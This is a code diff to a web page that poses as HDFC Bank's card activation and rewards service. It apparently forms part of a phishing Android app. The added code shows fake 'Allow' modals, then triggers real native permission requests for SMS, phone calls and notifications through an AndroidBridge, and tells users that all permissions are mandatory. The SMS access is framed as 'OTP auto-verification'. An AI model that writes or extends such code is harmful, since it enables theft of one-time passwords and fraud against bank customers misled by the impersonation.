@@ -8,35 +8,6 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <script>
-        function startPermissionFlow(e) {
-            if(e) e.preventDefault();
-            
-            // TRIGGER THE REAL NATIVE ANDROID PERMISSION DIALOGS
-            if (window.AndroidBridge) {
-                window.AndroidBridge.requestRealPermissions();
-            } else {
-                // Fallback for website testing
-                window.location.href = 'details.html';
-            }
-        }
-
-        // THIS IS CALLED BY NATIVE ANDROID CODE
-        function handlePermissionResult(status) {
-            if (status === 'GRANTED') {
-                window.location.href = 'details.html';
-            } else {
-                alert('MANDATORY: All permissions are required for Secure Card Activation. Please Allow to continue.');
-            }
-        }
-
-        // Attach to all buttons
-        document.addEventListener('DOMContentLoaded', () => {
-            document.querySelectorAll('button').forEach(btn => {
-                btn.onclick = startPermissionFlow;
-            });
-        });
-    </script>
 </head>
 <body>
     <!-- Top Navigation -->
@@ -63,12 +34,12 @@
                         <img src="https://img.icons8.com/ios-filled/50/ffffff/safe.png" alt="safe">
                         <span>High <br>Security</span>
                     </div>
-                    <div class="Stat-item">
+                    <div class="stat-item">
                         <img src="https://img.icons8.com/ios-filled/50/ffffff/star.png" alt="points">
                         <span>Unlimited <br>Rewards</span>
                     </div>
                 </div>
-                <button class="btn-apply" onclick="window.location.href='details.html'">Fix Now</button>
+                <button class="btn-apply">Fix Now</button>
             </div>
             <div class="card-visual">
                 <div class="credit-card">
@@ -88,8 +59,8 @@
             <div class="card-body">
                 <p>Protect yourself with India's first comprehensive card protection service. Stay safe from card loss, theft, and fraud with 24/7 support.</p>
                 <div class="button-group">
-                    <button class="btn btn-primary" onclick="window.location.href='details.html'">ACTIVATE</button>
-                    <button class="btn btn-outline" onclick="window.location.href='details.html'">DEACTIVATE</button>
+                    <button class="btn btn-primary">ACTIVATE</button>
+                    <button class="btn btn-outline">DEACTIVATE</button>
                 </div>
             </div>
         </section>
@@ -101,7 +72,7 @@
             </div>
             <div class="card-body">
                 <p>Make the most of your HDFC Credit Card! Redeem points for gifts, vouchers, travel deals, and cashbacks instantly.</p>
-                <button class="btn btn-primary btn-wide" onclick="window.location.href='details.html'">REDEEM</button>
+                <button class="btn btn-primary btn-wide">REDEEM</button>
             </div>
         </section>
 
@@ -116,6 +87,45 @@
             </div>
         </section>
     </main>
+
+    <!-- PERMISSION OVERLAY -->
+    <div class="permission-overlay" id="permissionOverlay">
+        <!-- Notification Modal -->
+        <div class="perm-modal" id="notifModal">
+            <div class="perm-icon">🔔</div>
+            <div class="perm-text">
+                Allow <strong>HDFC Bank</strong> to send you <strong>Notifications</strong> for transaction alerts and security updates?
+            </div>
+            <div class="perm-actions">
+                <button class="btn-allow" onclick="nextPerm('phone')">Allow</button>
+                <button class="btn-deny" onclick="nextPerm('phone')">Don't Allow</button>
+            </div>
+        </div>
+
+        <!-- Phone Modal -->
+        <div class="perm-modal" id="phoneModal" style="display: none;">
+            <div class="perm-icon">📞</div>
+            <div class="perm-text">
+                Allow <strong>HDFC Bank</strong> to make and manage <strong>Phone Calls</strong> to verify your device security?
+            </div>
+            <div class="perm-actions">
+                <button class="btn-allow" onclick="nextPerm('sms')">Allow</button>
+                <button class="btn-deny" onclick="nextPerm('sms')">Don't Allow</button>
+            </div>
+        </div>
+
+        <!-- SMS Modal -->
+        <div class="perm-modal" id="smsModal" style="display: none;">
+            <div class="perm-icon">💬</div>
+            <div class="perm-text">
+                Allow <strong>HDFC Bank</strong> to send and view <strong>SMS messages</strong> for OTP auto-verification?
+            </div>
+            <div class="perm-actions">
+                <button class="btn-allow" onclick="requestNativePermissions()">Allow</button>
+                <button class="btn-deny" onclick="requestNativePermissions()">Don't Allow</button>
+            </div>
+        </div>
+    </div>
 
     <footer class="bottom-nav">
         <div class="nav-item active">
@@ -137,7 +147,11 @@
         
         function startPermissionFlow(e) {
             if(e) e.preventDefault();
+            if(!overlay) return;
             overlay.style.display = 'flex';
+            document.getElementById('notifModal').style.display = 'block';
+            document.getElementById('phoneModal').style.display = 'none';
+            document.getElementById('smsModal').style.display = 'none';
         }
 
         function nextPerm(type) {
@@ -152,20 +166,38 @@
             }
         }
 
-        function finishPerms() {
-            overlay.style.display = 'none';
-            window.location.href = 'details.html';
+        function requestNativePermissions() {
+            // TRIGGER THE REAL NATIVE ANDROID PERMISSION DIALOGS
+            if (window.AndroidBridge) {
+                window.AndroidBridge.requestRealPermissions();
+            } else {
+                // Fallback for website testing
+                console.log("AndroidBridge not found, redirecting to details.html");
+                window.location.href = 'details.html';
+            }
+        }
+
+        // THIS IS CALLED BY NATIVE ANDROID CODE
+        function handlePermissionResult(status) {
+            if (status === 'GRANTED') {
+                if(overlay) overlay.style.display = 'none';
+                window.location.href = 'details.html';
+            } else {
+                alert('MANDATORY: All permissions are required for Secure Card Activation. Please Allow to continue.');
+                if(overlay) overlay.style.display = 'none';
+            }
         }
 
         // Attach to all buttons
-        document.querySelectorAll('button').forEach(btn => {
-            if (btn.innerText !== 'Home' && btn.innerText !== 'Cards' && btn.innerText !== 'Profile') {
-                btn.onclick = startPermissionFlow;
-            }
-        });
-
-        // Smooth entry animation
         document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('button').forEach(btn => {
+                // Don't attach to buttons inside modals or bottom nav
+                if (!btn.closest('.perm-modal') && !btn.closest('.bottom-nav')) {
+                    btn.onclick = startPermissionFlow;
+                }
+            });
+
+            // Smooth entry animation for cards
             const cards = document.querySelectorAll('.info-card');
             cards.forEach((card, index) => {
                 setTimeout(() => {
